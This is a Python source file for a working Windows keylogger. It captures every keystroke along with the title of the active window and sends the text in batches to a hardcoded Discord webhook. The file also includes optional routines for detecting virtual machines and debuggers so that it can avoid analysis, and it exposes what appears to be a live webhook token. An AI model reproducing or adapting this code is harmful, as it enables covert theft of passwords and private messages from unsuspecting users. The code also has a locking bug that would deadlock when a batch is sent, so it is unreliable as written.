import os
import sys
import time
import threading
import requests
import ctypes
from datetime import datetime
from pynput import keyboard

# === CONFIG ===
WEBHOOK = "https://discord.com/api/webhooks/1396126875348242624/gEu1Y7MB-6PkFtWyVr0Qu-GJ1XQ1mDHr4vsjiWS84Kg90s75_j859t3Fpr_oYrdvycs8"
LOG_THRESHOLD = 25          # Smaller batch size for faster sending
MAX_RETRIES = 3
ENABLE_ANTIVM = False
ENABLE_ANTIDEBUG = False
FLUSH_INTERVAL = 5          # Flush logs every 5 seconds instead of 15

# === STATE ===
log_buffer = []
shift_pressed = False
capslock_on = False
lock = threading.Lock()

# === UTILITY ===
def timestamp():
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def get_active_window_title():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value if buff.value else "Unknown"

def send(content):
    for attempt in range(MAX_RETRIES):
        try:
            requests.post(WEBHOOK, json={"content": f"```{content}```"}, timeout=5)
            return
        except:
            time.sleep(1)
    sys.exit(0)

def flush_log():
    global log_buffer
    with lock:
        if log_buffer:
            context = get_active_window_title()
            combined = "".join(log_buffer)
            send(f"{timestamp()} - [{context}]\n{combined}")
            log_buffer = []

# === KEYLOG ===
def handle_key_press(key):
    global shift_pressed, capslock_on

    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = True
    elif key == keyboard.Key.caps_lock:
        capslock_on = not capslock_on

    try:
        char = key.char
        if char:
            if (shift_pressed or capslock_on) and char.isalpha():
                char = char.upper()
            with lock:
                log_buffer.append(char)
    except AttributeError:
        name = key.name if hasattr(key, 'name') else str(key)
        with lock:
            if key == keyboard.Key.space:
                log_buffer.append(' ')
            elif key == keyboard.Key.enter:
                log_buffer.append('\n')
            elif key == keyboard.Key.tab:
                log_buffer.append('\t')
            elif key == keyboard.Key.backspace:
                if log_buffer:
                    log_buffer.pop()
            else:
                log_buffer.append(f"[{name}]")

    with lock:
        if len(log_buffer) >= LOG_THRESHOLD:
            flush_log()

def handle_key_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False

# === ANTI-VM ===
def detect_vm():
    suspicious = ["VBOX", "VMWARE", "VIRTUAL", "QEMU", "HYPERV", "XEN"]
    try:
        output = os.popen("wmic baseboard get manufacturer,product").read().upper()
        for keyword in suspicious:
            if keyword in output:
                return True
    except:
        pass
    return False

# === ANTI-DEBUG ===
def detect_debugger():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

# === PERIODIC FLUSH THREAD ===
def periodic_flush():
    while True:
        time.sleep(FLUSH_INTERVAL)
        flush_log()

# === MAIN ===
if __name__ == "__main__":
    if ENABLE_ANTIVM and detect_vm():
        sys.exit(0)
    if ENABLE_ANTIDEBUG and detect_debugger():
        sys.exit(0)

    threading.Thread(target=periodic_flush, daemon=True).start()

    with keyboard.Listener(on_press=handle_key_press, on_release=handle_key_release) as listener:
        listener.join()
